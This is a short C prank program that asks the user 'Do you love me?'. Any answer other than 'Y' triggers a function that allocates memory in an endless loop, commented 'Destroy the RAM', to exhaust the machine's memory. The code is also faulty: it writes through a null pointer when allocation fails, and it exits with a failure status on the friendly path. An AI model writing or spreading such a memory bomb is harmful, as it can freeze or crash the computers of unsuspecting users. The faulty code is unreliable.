#include <stdio.h>
#include <stdlib.h>
void karma(void); 
int main(void) {
    char choice;
    printf("Do you love me? (Y/N): ");
    scanf("%c", &choice);
    if(choice == 'Y') {
        printf("AWWW YOU'RE SO SWEEEEET\n");
        printf("I hope you have a good day!\n");
        exit(1);
    }else{
        printf("Okay.\n");
        karma();
    }
    return 0;
}
void karma(void) {
    while(1){
        int *p = malloc(1024 * 1024 *  sizeof(int)); //!Destroy the RAM
        if(p == NULL){
            p[0] = 1; //! the os has to give it
        }
    }
}